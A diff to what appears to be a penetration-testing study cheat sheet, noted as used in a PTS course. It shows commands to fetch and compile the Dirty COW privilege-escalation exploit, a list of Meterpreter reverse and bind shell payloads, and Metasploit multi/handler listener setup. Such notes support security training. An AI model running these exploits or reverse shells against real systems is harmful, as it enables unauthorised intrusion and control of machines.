@@ -461,7 +461,7 @@ searchsploit -m 40839
 gcc -pthread 40839.c -o dirty -lcrypt
 ```
 
-## MSF Payloads
+## MSF Payloads and Listeners
 - 64-bit (`x64`) payload cannot run on 32-bit architecture.
 - Staged payload (sent in 2 parts), non-staged/line payload (exploit and shellcode sent separately).
   - `windows/x64/meterpreter/reverse_tcp` is staged.
@@ -470,10 +470,15 @@ gcc -pthread 40839.c -o dirty -lcrypt
 ```
 windows/meterpreter/reverse_tcp
 windows/x64/meterpreter/reverse_tcp
-
 windows/meterpreter/bind_tcp
+```
+- Used in PTS course.
 
-linux/x86/meterpreter/reverse_tcp
+```
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST <ip>
+set LPORT <port>
 ```
 
 ### msfvenom
